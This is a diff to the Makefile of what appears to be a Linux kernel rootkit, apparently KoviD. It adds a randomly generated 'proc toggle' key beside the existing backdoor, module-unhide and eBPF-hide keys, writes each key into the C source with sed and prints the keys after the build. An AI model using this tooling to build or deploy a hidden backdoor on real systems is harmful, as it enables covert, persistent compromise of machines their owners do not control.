@@ -16,11 +16,13 @@ UUIDGEN := $(shell uuidgen)
 ifndef TEST_ENV
 BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
+PRCKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 PRCTIMEOUT := 1200
 EBPFHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 else
 BDKEY=0x7d3b1cb572f16425
 UNHIDEKEY=0x2
+PRCKEY=0x3
 PRCTIMEOUT := 120
 EBPFHIDEKEY=0x7d3b1cb572f16426
 endif
@@ -67,6 +69,7 @@ all:
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
 	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
 	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
+	@sed -i "s/\(uint64_t auto_prckey = \)[^;]*;/\1$(PRCKEY);/" src/kovid.c
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo "Build complete."
@@ -74,6 +77,8 @@ all:
 	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
 	@echo -n "LKM unhide KEY: "
 	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
+	@echo -n "Proc toggle KEY: "
+	@echo "\033[1;37m$(PRCKEY)\033[0m" | sed 's/0x//'
 	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
 	@echo -n "Build type: "
 ifdef DEPLOY
@@ -134,6 +139,7 @@ clang-format:
 reset-auto:
 	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\10x0000000000000000;/" src/sock.c
 	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\10x0000000000000000;/" src/kovid.c
+	@sed -i "s/\(uint64_t auto_prckey = \)[^;]*;/\10x0000000000000000;/" src/kovid.c
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\10x0000000000000000;/" tools/ebpf/main.c
 
 clean: reset-auto
